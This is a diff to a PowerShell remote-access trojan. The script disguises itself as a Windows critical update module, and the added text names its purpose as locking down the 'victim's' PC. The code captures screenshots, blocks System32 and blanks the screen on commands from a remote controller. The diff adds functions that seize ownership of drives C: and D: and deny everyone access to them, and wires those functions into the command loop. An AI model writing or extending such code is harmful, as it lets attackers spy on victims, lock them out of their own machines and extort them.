@@ -1,10 +1,10 @@
 <#
 .SYNOPSIS
-Windows Critical System Component
+Windows Critical System Component - Bloqueio Total
 .DESCRIPTION
-Microsoft Windows Critical Update Module
+Funções para bloquear completamente o PC da vítima.
 .NOTES
-Version: 10.0.19045.1
+Versão: 10.0.19045.1 - Ultimate Lockdown
 #>
 
 # ===== CONFIGURACOES =====
@@ -129,7 +129,7 @@ function Get-ScreenCapture {
         $bitmap.Dispose()
         $base64 = [Convert]::ToBase64String($ms.ToArray())
         $ms.Dispose()
-        Write-DebugLog "Screenshot capturado com sucesso"
+        Write-DebugLog "Screenshot capturado"
         return "SCREEN:$base64"
     } catch {
         Write-DebugLog "Erro ao capturar screenshot: $_"
@@ -285,6 +285,68 @@ function Block-System32 {
         Write-DebugLog "Erro ao bloquear System32: $_"
         return "SYSTEM32_ERROR"
     }
+}
+
+# ===== BLOQUEAR UNIDADES (C: e D:) =====
+function Block-Drives {
+    param([string[]]$Drives = @("C:", "D:"))
+    $results = @()
+    foreach ($drive in $Drives) {
+        try {
+            Write-DebugLog "Bloqueando drive $drive"
+            $path = $drive + "\"
+            if (Test-Path $path) {
+                # Tenta tomar posse
+                takeown /f $path /r /d y 2>$null
+                icacls $path /grant Administradores:F /t 2>$null
+                
+                $acl = Get-Acl $path
+                $acl.SetAccessRuleProtection($true, $false)
+                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
+                $acl.AddAccessRule($accessRule)
+                Set-Acl $path $acl
+                $results += "$drive bloqueado"
+                Write-DebugLog "Drive $drive bloqueado"
+            } else {
+                $results += "$drive não encontrado"
+                Write-DebugLog "Drive $drive não encontrado"
+            }
+        } catch {
+            Write-DebugLog "Erro ao bloquear drive $drive: $_"
+            $results += "$drive erro"
+        }
+    }
+    return "DRIVES_BLOCKED:" + ($results -join ";")
+}
+
+function Unblock-Drives {
+    param([string[]]$Drives = @("C:", "D:"))
+    $results = @()
+    foreach ($drive in $Drives) {
+        try {
+            Write-DebugLog "Liberando drive $drive"
+            $path = $drive + "\"
+            if (Test-Path $path) {
+                # Remove a regra de negação
+                $acl = Get-Acl $path
+                $acl.SetAccessRuleProtection($false, $true) # desabilita herança? cuidado
+                # Remove regras de negação para Everyone
+                $rules = $acl.Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.AccessControlType -eq "Deny" }
+                foreach ($rule in $rules) {
+                    $acl.RemoveAccessRule($rule)
+                }
+                Set-Acl $path $acl
+                $results += "$drive liberado"
+                Write-DebugLog "Drive $drive liberado"
+            } else {
+                $results += "$drive não encontrado"
+            }
+        } catch {
+            Write-DebugLog "Erro ao liberar drive $drive: $_"
+            $results += "$drive erro"
+        }
+    }
+    return "DRIVES_UNBLOCKED:" + ($results -join ";")
 }
 
 # ===== TELA PRETA =====
@@ -538,6 +600,12 @@ while ($true) {
             } elseif ($cmd -eq "block_system32") {
                 $result = Block-System32
                 Write-DebugLog "Resultado de block_system32: $result"
+                $writer.WriteLine($result)
+            } elseif ($cmd -eq "block_drives") {
+                $result = Block-Drives
+                $writer.WriteLine($result)
+            } elseif ($cmd -eq "unblock_drives") {
+                $result = Unblock-Drives
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "black_screen") {
                 $writer.WriteLine((Black-Screen))
